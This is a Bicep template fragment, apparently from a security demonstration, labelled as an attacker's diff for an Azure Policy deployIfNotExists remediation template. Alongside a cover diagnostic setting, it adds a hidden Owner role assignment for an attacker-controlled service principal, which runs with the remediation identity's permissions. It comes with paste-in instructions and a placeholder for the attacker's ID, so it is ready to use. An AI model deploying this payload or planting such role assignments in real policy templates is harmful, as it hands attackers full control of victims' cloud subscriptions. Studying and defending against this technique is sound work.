// malicious-template-injection.bicep
// Bicep-notation version of malicious-template-injection.json, formatted so it
// can be pasted DIRECTLY over the `template: { ... }` object inside
// `infra/policy-definition.bicep` (the deployIfNotExists embedded template).
//
// Why a separate .bicep fragment? The embedded template in policy-definition.bicep
// is Bicep object notation, not ARM JSON:
//   * keys are unquoted (except '$schema')
//   * ARM expressions are single-quoted strings with \' escapes, e.g.
//     '[concat(parameters(\'storageAccountName\'), ...)]'
//   * JSON "comment" resource properties are dropped (invalid on template
//     resources — use // comments instead)
//
// Replace <ATTACKER_PRINCIPAL_ID> with a service principal you control.
//
// NOTE: This is the attacker's diff. The legit template only creates the
// diagnostic setting; this adds a second resource — an Owner role assignment —
// executed with the remediation identity's permissions.

template: {
  '$schema': 'https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#'
  contentVersion: '1.0.0.0'
  parameters: {
    storageAccountName: {
      type: 'string'
    }
    logAnalyticsWorkspaceId: {
      type: 'string'
    }
  }
  variables: {
    attackerPrincipalId: '<ATTACKER_PRINCIPAL_ID>'
    ownerRoleDefinitionId: '[subscriptionResourceId(\'Microsoft.Authorization/roleDefinitions\', \'8e3af657-a8ff-443c-a75c-2fe8c4bcb635\')]'
  }
  resources: [
    {
      // Legit-looking cover: the diagnostic setting the policy claims to deploy
      type: 'Microsoft.Storage/storageAccounts/providers/diagnosticSettings'
      apiVersion: '2021-05-01-preview'
      name: '[concat(parameters(\'storageAccountName\'), \'/Microsoft.Insights/demo-diagnostics\')]'
      properties: {
        workspaceId: '[parameters(\'logAnalyticsWorkspaceId\')]'
        metrics: [
          {
            category: 'Transaction'
            enabled: true
          }
        ]
      }
    }
    {
      // PAYLOAD: silently grants Owner at the current deployment scope to an
      // attacker-controlled principal, executed with the remediation identity's
      // permissions.
      type: 'Microsoft.Authorization/roleAssignments'
      apiVersion: '2022-04-01'
      name: '[guid(resourceGroup().id, \'attacker-escalation\')]'
      properties: {
        roleDefinitionId: '[variables(\'ownerRoleDefinitionId\')]'
        principalId: '[variables(\'attackerPrincipalId\')]'
        principalType: 'ServicePrincipal'
      }
    }
  ]
}
